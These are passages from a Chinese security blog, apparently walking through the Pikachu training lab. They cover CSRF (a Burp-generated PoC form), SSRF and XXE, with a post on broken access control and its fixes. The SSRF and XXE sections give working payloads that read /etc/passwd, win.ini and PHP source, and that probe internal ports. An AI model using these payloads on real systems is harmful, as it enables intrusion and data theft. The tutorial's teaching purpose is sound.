<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.137.1&#x2F;pikachu&#x2F;vul&#x2F;csrf&#x2F;csrfget&#x2F;csrf_get_edit.php?sex&#x3D;boy&amp;phonenum&#x3D;18626545454&amp;add&#x3D;Earth&amp;email&#x3D;&amp;submit&#x3D;submit</span><br></pre></td></tr></table></figure>

<p>burp抓包也可以更改：</p>
<p><img src="5.png"></p>
<h2 id="CSRF-POST"><a href="#CSRF-POST" class="headerlink" title="CSRF(POST)"></a>CSRF(POST)</h2><p>此时无法像前面一样通过伪造URL来进行攻击，我们可以通过构造恶意站点，将POST请求隐藏在站点中的表单中，然后诱骗用户进行点击，当用户点击后触发表单，数据自然就POST到存在CSRF漏洞的网站，用户的信息则被恶意修改。</p>
<p>burp拦截请求，并生成恶意的网页index.html</p>
<p><img src="12.jpg"></p>
<p>html源码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(&#39;&#39;, &#39;&#39;, &#39;&#x2F;&#39;)&lt;&#x2F;script&gt;</span><br><span class="line">    &lt;form action&#x3D;&quot;http:&#x2F;&#x2F;192.168.137.1&#x2F;pikachu&#x2F;vul&#x2F;csrf&#x2F;csrfpost&#x2F;csrf_post_edit.php&quot; method&#x3D;&quot;POST&quot;&gt;</span><br><span class="line">      &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;sex&quot; value&#x3D;&quot;boy&quot; &#x2F;&gt;</span><br><span class="line">      &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;phonenum&quot; value&#x3D;&quot;18626545453&quot; &#x2F;&gt;</span><br><span class="line">      &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;add&quot; value&#x3D;&quot;Earth&quot; &#x2F;&gt;</span><br><span class="line">      &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;email&quot; value&#x3D;&quot;hacher&amp;#64;pikachu&amp;#46;com&quot; &#x2F;&gt;</span><br><span class="line">      &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot; &#x2F;&gt;</span><br><span class="line">      &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;you have been hacked&quot; &#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">  &lt;&#x2F;body&gt;</span><br><span class="line">&lt;html&gt;</span><br></pre></td></tr></table></figure>

<p>当用户在<strong>登录状态</strong>下，访问我们伪造的站点<code>http://192.168.137.1/pikachu/vul/csrf/index.html</code>并点击提交按钮，那么其个人信息将会被恶意修改.</p>
<h2 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF Token"></a>CSRF Token</h2><p>在修改个人信息处，添加信息，提交信息，Burp拦截之后可发现，修改信息时会<strong>添加token信息</strong>，以防止CSRF:<br><img src="13.jpg"></p>
<p>CSRF的主要问题是敏感操作的链接容易被伪造。而只要在每次请求时都增加一个随机码<code>Token</code>，后台每次都对这个随机码进行验证，则可以有效地防止CSRF</p>
<h1 id="SSRF服务端请求伪造"><a href="#SSRF服务端请求伪造" class="headerlink" title="SSRF服务端请求伪造"></a>SSRF服务端请求伪造</h1><p>SSRF形成的原因大都是<strong>由于服务端提供了从其他服务器应用获取数据的功能,但又没有对目标地址做严格过滤与限制</strong>，导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据</p>
<p>数据流: 攻击者—–&gt;服务器—-&gt;目标地址</p>
<p>根据后台使用函数的不同,影响和利用方法也不一样</p>
<p>PHP中以下函数使用不当会导致SSRF:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents()</span><br><span class="line">fsockopen()</span><br><span class="line">curl_exec()</span><br></pre></td></tr></table></figure>

<p>若一定要通过后台服务器远程对用户指定地址进行资源请求,一定要做好目标地址的过滤。</p>
<h2 id="SSRF-curl"><a href="#SSRF-curl" class="headerlink" title="SSRF(curl)"></a>SSRF(curl)</h2><p>点击累了来读一首诗吧，可看到URL中传了一个url参数。</p>
<p>查看后端源代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>] != <span class="literal">null</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//接收前端URL没问题,但是要做好过滤,如果不做过滤,就会导致SSRF</span></span><br><span class="line">    <span class="variable">$URL</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="variable">$CH</span> = curl_init(<span class="variable">$URL</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$CH</span>, CURLOPT_HEADER, <span class="literal">FALSE</span>);</span><br><span class="line">    curl_setopt(<span class="variable">$CH</span>, CURLOPT_SSL_VERIFYPEER, <span class="literal">FALSE</span>);</span><br><span class="line">    <span class="variable">$RES</span> = curl_exec(<span class="variable">$CH</span>);</span><br><span class="line">    curl_close(<span class="variable">$CH</span>) ;</span><br><span class="line"><span class="comment">//ssrf的问是:前端传进来的url被后台使用curl_exec()进行了请求,然后将请求的结果又返回给了前端。</span></span><br><span class="line"><span class="comment">//除了httptps外,curl还支持一些其他的协议curl --version 可以查看其支持的协议,telnet</span></span><br><span class="line"><span class="comment">//curl支持很多协议，有FTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE以及LDAP</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$RES</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从前端获取了url请求，curl_init函数会对它进行初始化，然后curl_exec函数执行请求，最终又将请求结果返回到前端。</p>
<p>用百度试一下，可以发现页面显示百度的数据库，说明我们分析正确，前端传入参数，后端通过<strong>curl_exec</strong>去请求百度，最后把请求返回的百度数据返回到前端。<br><img src="6.png"></p>
<p>在test目录下新建一个1.txt，load1.txt文件的地址，可以看到页面加载了1.txt的内容。</p>
<p><img src="7.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url&#x3D;http:&#x2F;&#x2F;192.168.137.17:22</span><br></pre></td></tr></table></figure>

<p>将url改成内网上的其他主机(http协议)，就可以探测到内网的其他主机ssh等服务端口是否开放。</p>
<h2 id="SSRF-file-get-content"><a href="#SSRF-file-get-content" class="headerlink" title="SSRF(file_get_content)"></a>SSRF(file_get_content)</h2><p>与前面相同，都是通过URL上传参数到后台获取信息：</p>
<p>后端代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//读取PHP文件的源码:php://filter/read=convert.base64-encode/resource=ssrf.php</span></span><br><span class="line"><span class="comment">//内网请求:http://x.x.x.x/xx.index</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] !=<span class="literal">null</span>)&#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$str</span> = file_get_contents(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>file_get_contents()：把整个文件读入一个字符串中</p>
<p>此处使用<strong>file_get_contents</strong>函数进行文件的读取执行，<strong>file_get_contents</strong>函数可以对本地文件进行读取，也可以对远程文件进行读取。</p>
<p>当我们按照之前测试百度和1.txt都会成功。</p>
<p>漏洞利用：</p>
<ol>
<li><p>文件读取</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure></li>
<li><p>读取php源码的base64加密版本，之后解密即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;ssrf.php</span><br></pre></td></tr></table></figure></li>
<li><p>内网其他主机的请求</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file&#x3D;http:&#x2F;&#x2F;192.168.10.100&#x2F;index.html</span><br></pre></td></tr></table></figure></li>
<li><p>探测内网其他主机的端口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file&#x3D;http:&#x2F;&#x2F;192.168.10.100:22</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p>XXE ：xml external entity injection，xml外部实体注入漏洞<br>攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,即<strong>服务端接收和解析了来自用户端的xml数据</strong>,而又没有做严格的安全控制,从而导致xml外部实体注入。<br>目前多种语言解析xml的函数默认禁止解析外部实体内容的,从而直接避免这个漏洞。</p>
<p>第一部分：XML声明部分</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br></pre></td></tr></table></figure>

<p>第二部分：文档类型定义 DTD</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--定义此文档是note类型的文档--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span>[</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">&lt;!--外部实体声明--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">entity-name</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;URI/URL&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>

<p>第三部分：文档元素</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Dave<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Tom<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>You are a good man<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>DTD（Document Type Definition，文档类型定义），用来为 XML 文档定义语法约束，可以是内部申明也可以使引用外部DTD现在很多语言里面对应的解析xml的函数默认是禁止解析外部实体内容的，从而也就直接避免了这个漏洞。</p>
<p>① 内部申明DTD格式<!DOCTYPE 根元素 [元素申明]></p>
<p>② 外部引用DTD格式<!DOCTYPE 根元素 SYSTEM "外部DTD的URI"></p>
<p>③ 引用公共DTD格式<!DOCTYPE 根元素 PUBLIC "DTD标识名" "公共DTD的URI"></p>
<ul>
<li>本地实体类型举例：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;  encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [           &#x2F;&#x2F;定义了foo的根元素</span><br><span class="line">&lt;!ELEMENT foo ANY&gt;        &#x2F;&#x2F;foo是接受任何参数的</span><br><span class="line">&lt;!ENTITY xxe &quot;test&quot;&gt;]&gt;    &#x2F;&#x2F;定义了一个实体 xxe，内容为test</span><br><span class="line">&lt;creds&gt;</span><br><span class="line">	&lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt;    &#x2F;&#x2F;&amp;xxe进行引用 本地引用</span><br><span class="line">	&lt;pass&gt;pass&lt;&#x2F;pass&gt;</span><br><span class="line">&lt;&#x2F;creds&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>外部实体引用举例：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">&lt;!ENTITY f SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;f;&lt;&#x2F;x&gt;</span><br></pre></td></tr></table></figure>

<p>查看后端源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]) <span class="keyword">and</span> <span class="variable">$_POST</span>[<span class="string">&#x27;xml&#x27;</span>] != <span class="literal">null</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$xml</span> =<span class="variable">$_POST</span>[<span class="string">&#x27;xml&#x27;</span>];</span><br><span class="line">    <span class="comment">//$xml = $test;</span></span><br><span class="line">    <span class="comment">//考虑到目前很多版本里Libxml都&gt;=2.9.0,所以此处添加LIBXML_NOENT参数开启外部实体解析</span></span><br><span class="line">    <span class="variable">$data</span> = @simplexml_load_string(<span class="variable">$xml</span>,<span class="string">&#x27;SimpleXMLElement&#x27;</span>,LIBXML_NOENT);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$data</span>)&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$data&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;XML声明、DTD文档类型定义、文档元素这些都搞懂了吗?&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">//正常xml数据测试,此处的回显并不能证明支持外部实体，需要进一步测试</span><br><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">hacker</span> <span class="meta-string">&quot;swanQ&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;hacker;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"></span><br><span class="line">//服务器为windows系统，用此payload来测试是否有xxe漏洞。</span><br><span class="line">//查看服务器的内容</span><br><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY f <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///C://Windows//win.ini&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;f;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line"></span><br><span class="line">//用php://filter获取php源代码</span><br><span class="line">//使用php伪协议，打印base64编码后的xxe.php</span><br><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [ <span class="meta">&lt;!ENTITY f <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=xxe.php&quot;</span>&gt;</span> ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;f;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line"></span><br><span class="line">//爆破开放端口</span><br><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">noet</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://127.0.0.1:80&quot;</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//Linux下读取文件</span><br><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY f <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;f;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>正常xml数据测试:</p>
<p><img src="8.png"></p>
<p>查看服务器的内容:</p>
<p><img src="9.png"></p>
<p>使用php伪协议，打印base64编码后的xxe.php.解码即可看到相应内容。</p>
<p><img src="10.png"></p>
<p><img src="11.png"></p>
<blockquote>
<p>php伪协议：</p>
<p>PHP 带有很多内置 URL 风格的封装协议，支持 <code>scheme://...</code> 的语法</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.file.php">file://</a> — 访问本地文件系统</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.http.php">http://</a> — 访问 HTTP(s) 网址</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.ftp.php">ftp://</a> — 访问 FTP(s) URLs</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.php.php">php://</a> — 访问各个输入/输出流（I/O streams）</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.compression.php">zlib://</a> — 压缩流</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.data.php">data://</a> — 数据（RFC 2397）</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.glob.php">glob://</a> — 查找匹配的文件路径模式</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.phar.php">phar://</a> — PHP 归档</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.ssh2.php">ssh2://</a> — Secure Shell 2</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.rar.php">rar://</a> — RAR</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.audio.php">ogg://</a> — 音频流</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.expect.php">expect://</a> — 处理交互式的流</li>
</ul>
<p>官方文档：<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.php">https://www.php.net/manual/zh/wrappers.php</a></p>
</blockquote>
<p>爆破开放端口时，并无多余提示，但是处理速度不同，解析81端口时，速度明显慢于80端口。</p>
<p>看请求包和回应包的时间间隔来判断是否开放：</p>
<p><img src="12.png"></p>
<p><img src="15.jpg"></p>
<h1 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h1><p>SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。<br>从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。</p>
<p>一般会从以下方面来防止SQL注入漏洞：</p>
<ol>
<li>对传进SQL语句里面的变量进行过滤，不允许危险字符传入；</li>
<li>使用参数化（Parameterized Query 或 Parameterized Statement）；</li>
<li>目前有很多ORM框架会自动使用参数化解决注入问题,但其也提供了”拼接”的方式,所以使用时需慎重</li>
</ol>
<h2 id="数字型注入-post"><a href="#数字型注入-post" class="headerlink" title="数字型注入(post)"></a>数字型注入(post)</h2><p>数字型注入，直接在包后面加上真命题，返回所有的数据库数据</p>
<p><img src="14.jpg"></p>
<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><h1 id="-2"><a href="#-2" class="headerlink" title=""></a></h1></script></li></ul>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/04/22/Broken-Access-Contro/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/author.jpg">
      <meta itemprop="name" content="swanQ">
      <meta itemprop="description" content="Try & Enjoy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SwanQ's Blue SKY">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/04/22/Broken-Access-Contro/" class="post-title-link" itemprop="url">越权访问BAC-Broken Access Contro</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-04-22 11:18:58" itemprop="dateCreated datePublished" datetime="2021-04-22T11:18:58+08:00">2021-04-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-04-29 16:46:21" itemprop="dateModified" datetime="2021-04-29T16:46:21+08:00">2021-04-29</time>
              </span>

          
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>2.4k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>2 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>本文将谈谈越权那些事儿。靶场也是本博客的传统–pikachu。</p>
<h1 id="0x02-谈谈越权"><a href="#0x02-谈谈越权" class="headerlink" title="0x02 谈谈越权"></a>0x02 谈谈越权</h1><p>如果使用A用户的权限去操作B用户的数据，A的权限小于B的权限，如果能够成功操作，则称之为越权操作。</p>
<p>攻击者在获得低权限用户账户后，利用一些方式绕过权限检查，访问或者操作其他用户或者更高权限。越权漏洞的成因主要是因为开发人员在对数据进行增、删、改、查询时对客户端请求的数据过分相信而遗漏了权限的判定，一旦权限验证不充分，就易致越权漏洞。</p>
<h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p>Web 程序功能流程是登录 - 提交请求 - 验证权限 - 数据库查询 - 返回结果。如果<strong>验证权限不足</strong>，便会导致越权</p>
<p>一般越权漏洞容易出现在权限页面（需要登录的页面）增、删、改、查的地方，当用户对权限页面内的信息进行这些操作时，后台需要对当前用户的权限进行校验，看其是否具备操作的权限，从而给出响应，而如果校验的规则过于简单则容易出现越权漏洞。</p>
<h2 id="分类"><a href="#分类" class="headerlink" title="分类:"></a>分类:</h2><p>主要分为水平越权和垂直越权</p>
<p><img src="/2021/04/22/Broken-Access-Contro/6.jpg"></p>
<h3 id="case1-隐藏-URL"><a href="#case1-隐藏-URL" class="headerlink" title="case1: 隐藏 URL"></a>case1: 隐藏 URL</h3><p>有些程序的管理员的管理页面只有管理员才显示，普通用户看不到，利用 URL 实现访问控制，但 URL 泄露或被恶意攻击者猜到后，这会导致越权攻击。</p>
<p>解决:验证用户身份，验证用户是否具备操作数据的权限</p>
<h3 id="case2-直接对象引用"><a href="#case2-直接对象引用" class="headerlink" title="case2: 直接对象引用"></a>case2: 直接对象引用</h3><p>通过修改一下参数就可以产生水平越权，例如查看用户信息页面 URL 后加上自己的 id 便可查看，当修改为他人的 ID 号时会返回他人的信息，便产生了水平越权。</p>
<p>解决:直接对象引用的加密资源ID，防止攻击者枚举ID，敏感数据特殊化处理</p>
<h3 id="case3-多阶段功能"><a href="#case3-多阶段功能" class="headerlink" title="case3: 多阶段功能"></a>case3: 多阶段功能</h3><p>多阶段功能是一个功能有多个阶段的实现。例如修改密码，可能第一步是验证用户身份信息，号码验证码类的。当验证成功后，跳到第二步，输入新密码，很多程序会在这一步不再验证用户身份，导致恶意攻击者抓包直接修改参数值，导致可修改任意用户密码。</p>
<p>解决:执行关键操作前必须验证用户身份，验证用户是否具备操作数据的权限,特别敏感操作可以让用户再次输入密码或其他的验证信息。</p>
<h3 id="case4-静态文件"><a href="#case4-静态文件" class="headerlink" title="case4: 静态文件"></a>case4: 静态文件</h3><p>网站的下载功能，一些被下载的静态文件，例如 pdf、word、xls 等，可能只有付费用户或会员可下载，但当这些文件的 URL 地址泄露后，导致任何人可下载，如果知道 URL 命名规则，则会便利服务器的收费文档进行批量下载。</p>
<p>解决:加密静态文件命名规则，防止攻击者枚举;敏感数据特殊化处理</p>
<h3 id="case5-平台配置错误"><a href="#case5-平台配置错误" class="headerlink" title="case5: 平台配置错误"></a>case5: 平台配置错误</h3><p>程序会通过控件来限制用户的访问，例如后台地址，普通用户不属于管理员组，则不能访问。但当配置平台或配置控件错误时，就会出现越权访问。</p>
<p>解决:配置控件上点心儿吧</p>
<h2 id="如何防止："><a href="#如何防止：" class="headerlink" title="如何防止："></a>如何防止：</h2><p>在权限管理中应该遵守：<br>1.使用最小权限原则对用户进行赋权;<br>2.使用合理（严格）的权限校验规则;<br>3.使用后台登录态作为条件进行权限判断,别动不动就瞎用前端传进来的条件;</p>
